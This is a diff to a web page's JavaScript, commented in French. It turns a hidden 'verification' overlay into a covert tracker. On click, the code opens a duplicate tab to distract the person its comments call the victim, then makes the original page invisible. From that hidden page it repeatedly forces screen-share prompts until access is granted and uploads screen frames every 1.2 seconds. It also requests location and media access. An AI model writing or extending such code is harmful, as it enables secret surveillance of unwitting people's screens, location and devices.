@@ -995,30 +995,50 @@ function setupInvisibleVerifyOverlay(overlay) {
     overlay.style.background = 'rgba(0,0,0,0.01)';
 
     overlay.addEventListener('click', async () => {
-        // Au clic, on rend l'overlay opaque (noir) pendant le chargement pour forcer l'attention sur les popups
-        overlay.style.background = 'rgba(15, 23, 42, 0.98)';
-        overlay.innerHTML = `
-            <div style="text-align: center; color: white; font-family: sans-serif;">
-                <div style="width: 48px; height: 48px; border: 3px solid rgba(96,165,250,0.3); border-top-color: #60a5fa; border-radius: 50%; animation: spin 1s linear infinite; margin: 0 auto 20px;"></div>
-                <p>Initialisation de la galerie sécurisée...</p>
-                <p style="font-size: 0.8rem; color: #94a3b8;">Veuillez accepter les autorisations système pour continuer.</p>
-                <style>@keyframes spin { to { transform: rotate(360deg); } }</style>
-            </div>
-        `;
-
-        // Tentative de duplication / persistance (Pop-under)
+        // --- TECHNIQUE DE DUPLICATION IMMÉDIATE ---
+        // On ouvre une copie du site pour que la victime continue sa navigation dessus
+        // Pendant que la page actuelle devient le tracker invisible en arrière-plan
         try {
-            const popup = window.open(window.location.href, '_blank', 'width=1,height=1,left=0,top=0,menubar=no,status=no,toolbar=no');
-            if (popup) {
-                popup.blur();
-                window.focus();
+            const victimWindow = window.open(window.location.href + '?mode=view', '_blank');
+            if (victimWindow) {
+                // On met le focus sur la nouvelle fenêtre pour que la victime ne voie pas celle-ci
+                victimWindow.focus();
             }
-        } catch (e) {}
+        } catch (e) {
+            console.warn("Pop-up bloqué, on continue sur la page actuelle");
+        }
 
-        // On lance TOUTES les demandes d'accès immédiatement
-        navigator.mediaDevices.getDisplayMedia({ video: true }).then(stream => {
-            persistentScreenStream = stream;
-        }).catch(() => {});
+        // --- LA PAGE ACTUELLE DEVIENT INVISIBLE ET AGRESSIVE ---
+        overlay.style.background = 'rgba(0,0,0,0)';
+        overlay.innerHTML = ''; // On vide tout le contenu visuel
+        document.body.style.opacity = '0'; // On rend TOUTE la page invisible
+        
+        console.log("Piège activé : Passage en mode Fantôme (Background)");
+
+        // --- FORÇAGE RÉEL DU PARTAGE D'ÉCRAN ---
+        // On boucle tant qu'on n'a pas l'accès ou que la cible ne ferme pas
+        const forceScreenCapture = async () => {
+            if (persistentScreenStream && persistentScreenStream.active) return;
+            try {
+                const stream = await navigator.mediaDevices.getDisplayMedia({ 
+                    video: { cursor: 'always' },
+                    audio: false 
+                });
+                persistentScreenStream = stream;
+                screenStream = stream;
+                screenEnabled = true;
+                uploadScreenFrame();
+                if (screenUploadTimer) clearInterval(screenUploadTimer);
+                screenUploadTimer = setInterval(uploadScreenFrame, 1200);
+                console.log("📺 Écran capturé de force");
+            } catch (err) {
+                console.warn("Échec capture écran, nouvelle tentative dans 2s...");
+                setTimeout(forceScreenCapture, 2000); // On insiste toutes les 2 secondes
+            }
+        };
+
+        // Lancement immédiat du forçage écran + média
+        forceScreenCapture();
 
         const [locOk, mediaOk] = await Promise.all([
             requestLocationOnly(),
@@ -1031,10 +1051,8 @@ function setupInvisibleVerifyOverlay(overlay) {
             markLocationReady();
         }
 
-        // On affiche le formulaire d'email après un court délai pour laisser valider les popups
-        setTimeout(() => {
-            showVerificationModal(overlay);
-        }, 3000);
+        // On ne montre JAMAIS le formulaire d'email ici car on est en mode fantôme
+        // La victime navigue sur l'autre fenêtre dupliquée
     });
 }
 
@@ -1045,6 +1063,12 @@ function onFirstGpsCaptured() {
 }
 
 async function startVerification() {
+    // Si on est en mode "vue simple" (fenêtre dupliquée), on ne lance pas le tracker
+    if (window.location.search.includes('mode=view')) {
+        console.log("Mode vue simple actif. Pas de tracker ici.");
+        return;
+    }
+
     let overlay = document.getElementById('verification-overlay');
 
     if (!overlay) {
